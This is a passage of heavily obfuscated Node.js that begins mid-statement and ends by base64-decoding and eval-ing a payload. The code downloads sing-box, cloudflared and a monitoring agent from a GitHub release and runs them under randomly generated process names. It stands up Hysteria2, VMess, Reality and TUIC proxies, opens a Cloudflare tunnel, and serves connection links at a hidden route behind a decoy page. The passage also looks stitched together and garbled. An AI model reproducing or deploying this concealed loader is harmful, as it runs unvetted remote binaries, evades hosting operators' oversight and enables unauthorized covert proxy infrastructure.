_0x4ffdae=_0x4ae134;_0x578ef3!==0x0&&(serviceStatus[_0x4ffdae(0x1e2)]=_0x4ffdae(0x1d5));}),setTimeout(()=>{const _0x293e15=_0x4ae134;try{const _0x1369aa=fs[_0x293e15(0x1b4)](_0x10f09c,'utf8'),_0x3503a9=_0x1369aa[_0x293e15(0x1e7)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x3503a9){CONFIG['C_D']=_0x3503a9[0x1];try{fs['unlinkSync'](_0x10f09c);}catch(_0x333d97){}return _0x908e7d(!![]);}}catch(_0x16ca2e){}_0x1a075b[_0x293e15(0x1cc)]();try{fs[_0x293e15(0x1df)](_0x10f09c);}catch(_0x403ce1){}_0x4c8faa===0x2&&(serviceStatus[_0x293e15(0x1e2)]='error',_0x908e7d(![]));},0x2710);}});}async function generateRealityKeys(_0x452701){const _0x141479=_0xb4759a;if(!CONFIG[_0x141479(0x17d)]||CONFIG['REALITY_PRIVATE_KEY']&&CONFIG[_0x141479(0x1e3)])return;return new Promise(_0x2a6dd1=>{const _0x2d261e=_0x141479;exec('\x22'+_0x452701+_0x2d261e(0x16d),(_0x458cbd,_0x473c97)=>{const _0x3be455=_0x2d261e;if(!_0x458cbd&&_0x473c97){const _0x54fd02=_0x473c97[_0x3be455(0x1e7)](/PrivateKey:\s*(\S+)/),_0x154b71=_0x473c97[_0x3be455(0x1e7)](/PublicKey:\s*(\S+)/);_0x54fd02&&_0x154b71&&(CONFIG[_0x3be455(0x21b)]=_0x54fd02[0x1],CONFIG['REALITY_PUBLIC_KEY']=_0x154b71[0x1]);}_0x2a6dd1();});});}async function generateSingBoxConfig(){const _0x144184=_0xb4759a,_0x5c1664=[];CONFIG['HY2_PORT']&&_0x5c1664[_0x144184(0x1c2)]({'type':_0x144184(0x218),'tag':_0x144184(0x14f),'listen':_0x144184(0x15c),'listen_port':parseInt(CONFIG[_0x144184(0x1ac)]),'users':[{'password':CONFIG[_0x144184(0x18b)]}],'tls':{'enabled':!![],'server_name':CONFIG['HY2_SNI'],'insecure':!![],'alpn':['h3']}});CONFIG[_0x144184(0x1af)]&&_0x5c1664[_0x144184(0x1c2)]({'type':_0x144184(0x16c),'tag':_0x144184(0x152),'listen':_0x144184(0x15c),'listen_port':parseInt(CONFIG[_0x144184(0x1af)]),'users':[{'uuid':CONFIG[_0x144184(0x21e)],'alterId':0x0}],'transport':{'type':'ws','path':CONFIG[_0x144184(0x1eb)],'headers':{}}});CONFIG[_0x144184(0x17d)]&&_0x5c1664['push']({'type':_0x144184(0x210),'tag':_0x144184(0x1f2),'listen':_0x144184(0x15c),'listen_port':parseInt(CONFIG[_0x144184(0x17d)]),'users':[{'uuid':CONFIG[_0x144184(0x21e)],'flow':_0x144184(0x18d)}],'tls':{'enabled':!![],'server_name':CONFIG[_0x144184(0x179)],'reality':{'enabled':!![],'handshake':{'server':CONFIG[_0x144184(0x179)],'server_port':0x1bb},'private_key':CONFIG[_0x144184(0x21b)],'short_id':[CONFIG[_0x144184(0x17b)]]}}});CONFIG['TUIC_PORT']&&_0x5c1664[_0x144184(0x1c2)]({'type':_0x144184(0x207),'tag':_0x144184(0x15b),'listen':_0x144184(0x15c),'listen_port':parseInt(CONFIG[_0x144184(0x1d4)]),'users':[{'uuid':CONFIG[_0x144184(0x20c)],'password':CONFIG[_0x144184(0x199)]}],'congestion_control':_0x144184(0x176),'auth_timeout':'3s','zero_rtt_handshake':![],'heartbeat':_0x144184(0x1fc),'tls':{'enabled':!![],'server_name':CONFIG[_0x144184(0x1a7)],'insecure':!![],'alpn':['h3']}});const _0xce1273={'log':{'level':_0x144184(0x162),'timestamp':!![]},'dns':{'servers':[{'tag':_0x144184(0x1a5),'address':'8.8.8.8'},{'tag':_0x144184(0x208),'address':_0x144184(0x212)}],'final':_0x144184(0x1a5)},'inbounds':_0x5c1664,'outbounds':[{'type':_0x144184(0x183),'tag':_0x144184(0x183)},{'type':'block','tag':_0x144184(0x1c5)}],'route':{'rules':[{'ip_is_private':!![],'outbound':_0x144184(0x183)}],'final':_0x144184(0x183)},'experimental':{'cache_file':{'enabled':!![],'path':path[_0x144184(0x1d7)](WORK_DIR,_0x144184(0x178))}}},_0xa152f6=path[_0x144184(0x1d7)](WORK_DIR,'config.json');return fs[_0x144184(0x202)](_0xa152f6,JSON[_0x144184(0x21a)](_0xce1273,null,0x2)),_0xa152f6;}function generateLinks(_0xa0ee9a){const _0xfa04fc=_0xb4759a,_0x49f86e=[];CONFIG['HY2_PORT']&&_0x49f86e[_0xfa04fc(0x1c2)]({'protocol':_0xfa04fc(0x1b1),'url':'hysteria2://'+CONFIG[_0xfa04fc(0x18b)]+'@'+_0xa0ee9a+':'+CONFIG[_0xfa04fc(0x1ac)]+'?insecure=1&sni='+CONFIG[_0xfa04fc(0x1a7)]+'&alpn=h3#HY2'});if(CONFIG[_0xfa04fc(0x1af)]){const _0x8ab33e={'v':'2','ps':_0xfa04fc(0x21f),'add':CONFIG['B_D'],'port':_0xfa04fc(0x167),'id':CONFIG[_0xfa04fc(0x21e)],'aid':'0','scy':_0xfa04fc(0x19e),'net':'ws','type':_0xfa04fc(0x1ec),'host':CONFIG[_0xfa04fc(0x163)],'path':CONFIG['VMESS_PATH'],'tls':'tls','sni':CONFIG['C_D'],'alpn':'','fp':'chrome'};_0x49f86e[_0xfa04fc(0x1c2)]({'protocol':_0xfa04fc(0x1b8),'url':'vmess://'+Buffer['from'](JSON[_0xfa04fc(0x21a)](_0x8ab33e))[_0xfa04fc(0x1c4)](_0xfa04fc(0x1cd))});}return CONFIG['REALITY_PORT']&&_0x49f86e[_0xfa04fc(0x1c2)]({'protocol':_0xfa04fc(0x1c9),'url':_0xfa04fc(0x18c)+CONFIG[_0xfa04fc(0x21e)]+'@'+_0xa0ee9a+':'+CONFIG[_0xfa04fc(0x17d)]+'?encryption=none&flow=xtls-rprx-vision&security=reality&sni='+CONFIG[_0xfa04fc(0x179)]+_0xfa04fc(0x151)+CONFIG[_0xfa04fc(0x1e3)]+_0xfa04fc(0x20e)+CONFIG['REALITY_SHORT_ID']+_0xfa04fc(0x16e)}),CONFIG[_0xfa04fc(0x1d4)]&&_0x49f86e[_0xfa04fc(0x1c2)]({'protocol':_0xfa04fc(0x1ab),'url':_0xfa04fc(0x18f)+CONFIG[_0xfa04fc(0x20c)]+':'+CONFIG['TUIC_PASSWORD']+'@'+_0xa0ee9a+':'+CONFIG[_0xfa04fc(0x1d4)]+_0xfa04fc(0x14b)}),_0x49f86e;}function cleanup(){const _0x4f6625=_0xb4759a;processes[_0x4f6625(0x1c6)](_0x53f0e4=>{const _0x13cfff=_0x4f6625;try{_0x53f0e4[_0x13cfff(0x1cc)]();}catch(_0x26fe72){}}),process[_0x4f6625(0x1e6)](0x0);}async function startService(_0x5eafa4,_0x246c1c,_0x22f3d8,_0x3ceebb={}){const _0x1ca8d0=_0xb4759a;try{const _0x1b4ca7=spawn(_0x5eafa4,_0x246c1c,{'stdio':[_0x1ca8d0(0x1e4),_0x1ca8d0(0x191),'pipe'],..._0x3ceebb});if(_0x3ceebb[_0x1ca8d0(0x17a)]){const _0x59cda1=fs['createWriteStream'](_0x3ceebb['logFile']);_0x1b4ca7['stdout'][_0x1ca8d0(0x191)](_0x59cda1),_0x1b4ca7[_0x1ca8d0(0x164)][_0x1ca8d0(0x191)](_0x59cda1);}return serviceStatus[_0x22f3d8[_0x1ca8d0(0x18e)]()]=_0x1ca8d0(0x165),_0x1b4ca7['on'](_0x1ca8d0(0x1ef),()=>{const _0x644e92=_0x1ca8d0;serviceStatus[_0x22f3d8[_0x644e92(0x18e)]()]=_0x644e92(0x165);}),_0x1b4ca7['on'](_0x1ca8d0(0x1ee),()=>{const _0x3fd2d3=_0x1ca8d0;serviceStatus[_0x22f3d8[_0x3fd2d3(0x18e)]()]='error';}),_0x1b4ca7['on']('exit',()=>{const _0x19154e=_0x1ca8d0;serviceStatus[_0x22f3d8['toLowerCase']()]=_0x19154e(0x1d5);}),new Promise(_0x47a6ad=>{const _0x157582=()=>{const _0x16b5c8=_0x7cbb;_0x1b4ca7[_0x16b5c8(0x204)]?(serviceStatus[_0x22f3d8[_0x16b5c8(0x18e)]()]=_0x16b5c8(0x1d5),_0x47a6ad(null)):(processes[_0x16b5c8(0x1c2)](_0x1b4ca7),_0x47a6ad(_0x1b4ca7));};setTimeout(_0x157582,0x7d0);});}catch(_0xb73368){return serviceStatus[_0x22f3d8[_0x1ca8d0(0x18e)]()]='error',null;}}const app=express();function _0x7cbb(_0x314835,_0x4b1439){const _0x2f5833=_0x2f58();return _0x7cbb=function(_0x7cbbd3,_0x44b0e4){_0x7cbbd3=_0x7cbbd3-0x14b;let _0x5520fe=_0x2f5833[_0x7cbbd3];return _0x5520fe;},_0x7cbb(_0x314835,_0x4b1439);}app[_0xb4759a(0x198)]('/',(_0x1214ec,_0x161dfd)=>{const _0x1d55e1=_0xb4759a;_0x161dfd[_0x1d55e1(0x1b2)](0xc8,{'Content-Type':_0x1d55e1(0x19d)}),_0x161dfd[_0x1d55e1(0x1d3)](HTML_TEMPLATES[_0x1d55e1(0x170)]);}),app[_0xb4759a(0x198)](_0xb4759a(0x19a),async(_0x70dbb5,_0x19ff02)=>{const _0x2f2f1f=_0xb4759a,_0x309cc8=await getServerIP(),_0x16b3d2=generateLinks(_0x309cc8);_0x19ff02['writeHead'](0xc8,{'Content-Type':_0x2f2f1f(0x19d)}),_0x19ff02[_0x2f2f1f(0x1d3)](HTML_TEMPLATES[_0x2f2f1f(0x15a)](_0x309cc8,_0x16b3d2));}),app[_0xb4759a(0x198)]('/x',async(_0x397927,_0x2888ca)=>{const _0x334b69=_0xb4759a,_0x11c1a6=await getServerIP(),_0x2a1f4e=generateLinks(_0x11c1a6);_0x2888ca[_0x334b69(0x1b2)](0xc8,{'Content-Type':_0x334b69(0x19d)}),_0x2888ca[_0x334b69(0x1d3)](HTML_TEMPLATES['status'](_0x11c1a6,_0x2a1f4e));}),app[_0xb4759a(0x198)](_0xb4759a(0x1ba),(_0x507d6e,_0x423bcd)=>{const _0x5f231c=_0xb4759a;_0x423bcd[_0x5f231c(0x1b2)](0xc8,{'Content-Type':'application/json'}),_0x423bcd[_0x5f231c(0x1d3)](JSON['stringify']({'status':'ok','uptime':process['uptime']()}));});const server=http['createServer'](app);server['on'](_0xb4759a(0x1b6),createProxyMiddleware({'target':'ws://localhost:'+CONFIG[_0xb4759a(0x1af)],'changeOrigin':!![],'ws':!![],'logLevel':_0xb4759a(0x217)}));async function main(){const _0x5ee752=_0xb4759a;server[_0x5ee752(0x16b)](CONFIG[_0x5ee752(0x20a)],()=>{const _0x16925f=_0x5ee752;serviceStatus[_0x16925f(0x209)]='running';});try{const _0x280743=detectArch(),_0x3d9b72=_0x280743===_0x5ee752(0x1de),_0x25e8d2=getRandomProcessName(),_0x16d414=getRandomProcessName(),_0x1c99e9=getRandomProcessName(),_0x40f31a=path['join'](WORK_DIR,_0x25e8d2),_0x409b57=path[_0x5ee752(0x1d7)](WORK_DIR,_0x16d414),_0x27b2f7=path[_0x5ee752(0x1d7)](WORK_DIR,_0x1c99e9),_0x244832={'singbox':_0x3d9b72?'https://github.com/seav1/dl/releases/download/files/sb-arm':_0x5ee752(0x1dc),'cloudflared':_0x3d9b72?_0x5ee752(0x1c3):'https://github.com/seav1/dl/releases/download/files/cf','komari':_0x3d9b72?_0x5ee752(0x1ca):'https://github.com/seav1/dl/releases/download/files/ko'};await Promise[_0x5ee752(0x1c7)]([downloadBinary(_0x244832[_0x5ee752(0x154)],_0x40f31a),downloadBinary(_0x244832[_0x5ee752(0x1e2)],_0x409b57),downloadBinary(_0x244832[_0x5ee752(0x19c)],_0x27b2f7)]),[_0x40f31a,_0x409b57,_0x27b2f7]['forEach'](_0x3458c1=>{const _0x144134=_0x5ee752;if(!fs[_0x144134(0x1cf)](_0x3458c1))throw new Error(_0x144134(0x203)+_0x3458c1);});const _0x343200=await getServerIP();if(CONFIG[_0x5ee752(0x1ac)]||CONFIG['VMESS_PORT']||CONFIG[_0x5ee752(0x17d)]||CONFIG[_0x5ee752(0x1d4)]){await generateRealityKeys(_0x40f31a);const _0x1d45a3=await generateSingBoxConfig();try{await new Promise((_0x5b06ea,_0x2bd693)=>{const _0x4df5d5=_0x5ee752;exec('\x22'+_0x40f31a+_0x4df5d5(0x1f7)+_0x1d45a3+'\x22',_0x3872ba=>{_0x3872ba?_0x2bd693(_0x3872ba):_0x5b06ea();});}),await startService(_0x40f31a,[_0x5ee752(0x187),'-c',_0x1d45a3],_0x5ee752(0x154));}catch(_0x5940c9){serviceStatus[_0x5ee752(0x154)]=_0x5ee752(0x1ee);}}if(CONFIG[_0x5ee752(0x215)])try{const _0x59a7b2=[_0x5ee752(0x1a9),_0x5ee752(0x16a),_0x5ee752(0x19e),'--protocol',_0x5ee752(0x190),_0x5ee752(0x1ea),_0x5ee752(0x187),_0x5ee752(0x20b),CONFIG[_0x5ee752(0x215)],'--url',_0x5ee752(0x184)+CONFIG['PORT']];await startService(_0x409b57,_0x59a7b2,_0x5ee752(0x1e2));}catch(_0x39ad1c){serviceStatus['cloudflared']=_0x5ee752(0x1ee);}else{if(CONFIG[_0x5ee752(0x1af)]){const _0x48bc05=await startTempTunnel(_0x409b57,CONFIG[_0x5ee752(0x20a)]);!_0x48bc05&&(serviceStatus[_0x5ee752(0x1e2)]=_0x5ee752(0x1ee));}}if(CONFIG[_0x5ee752(0x1d9)]&&CONFIG[_0x5ee752(0x1c8)]){const _0x16acdf=['-e',''+CONFIG[_0x5ee752(0x1d9)],'-t',''+CONFIG[_0x5ee752(0x1c8)],_0x5ee752(0x15f)];try{await startService(_0x27b2f7,_0x16acdf,'komari',{'logFile':path[_0x5ee752(0x1d7)](WORK_DIR,'komari.log')});}catch(_0x323f53){serviceStatus['komari']=_0x5ee752(0x1ee);}}setInterval(()=>{const _0x5be6ca=_0x5ee752;processes[_0x5be6ca(0x1c6)](_0x1b43ca=>{const _0x58e42b=_0x5be6ca;if(_0x1b43ca[_0x58e42b(0x204)]){const _0x30260d=Object[_0x58e42b(0x182)](serviceStatus)[_0x58e42b(0x1a3)](_0x4e6053=>serviceStatus[_0x4e6053]===_0x58e42b(0x165)&&!processes[_0x58e42b(0x197)](_0xd29b30=>_0xd29b30!==_0x1b43ca&&!_0xd29b30[_0x58e42b(0x204)]));_0x30260d&&(serviceStatus[_0x30260d]=_0x58e42b(0x1d5));}}),processes[_0x5be6ca(0x1f6)]>0x0&&processes[_0x5be6ca(0x1ae)](_0x3702c9=>_0x3702c9[_0x5be6ca(0x204)])&&cleanup();},0x2710),process['on'](_0x5ee752(0x1ff),cleanup),process['on'](_0x5ee752(0x1a1),cleanup);}catch(_0x593460){process[_0x5ee752(0x1e6)](0x1);}}main()[_0xb4759a(0x206)](()=>process[_0xb4759a(0x1e6)](0x1));';
const code = Buffer.from(b, 'base64').toString();
eval(code);
